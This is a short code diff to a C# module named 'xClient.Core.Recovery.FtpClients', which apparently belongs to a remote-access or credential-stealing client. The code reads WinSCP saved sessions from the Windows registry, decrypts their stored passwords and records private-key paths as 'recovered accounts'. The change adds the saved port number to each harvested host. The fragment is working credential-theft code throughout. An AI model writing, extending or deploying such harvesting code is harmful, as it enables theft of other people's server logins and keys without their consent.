@@ -26,6 +26,10 @@ namespace xClient.Core.Recovery.FtpClients
                             string Password = WinSCPDecrypt(User, Registry.GetValue(key.OpenSubKey(subkeyName).ToString(), "Password", "").ToString(), Host);
                             if ((Password == string.Empty) && ((Registry.GetValue(key.OpenSubKey(subkeyName).ToString(), "PublicKeyFile", null) != null)))
                                 Password = "[PRIVATE KEY AT " + Uri.UnescapeDataString(Registry.GetValue(key.OpenSubKey(subkeyName).ToString(), "PublicKeyFile", null).ToString()) + "]";
+                            if (Registry.GetValue(key.OpenSubKey(subkeyName).ToString(), "PortNumber", null) != null)
+                            {
+                                Host = Host + ":" + Registry.GetValue(key.OpenSubKey(subkeyName).ToString(), "PortNumber", null);
+                            }
                             data.Add(new RecoveredAccount
                             {
                                 URL = Host,
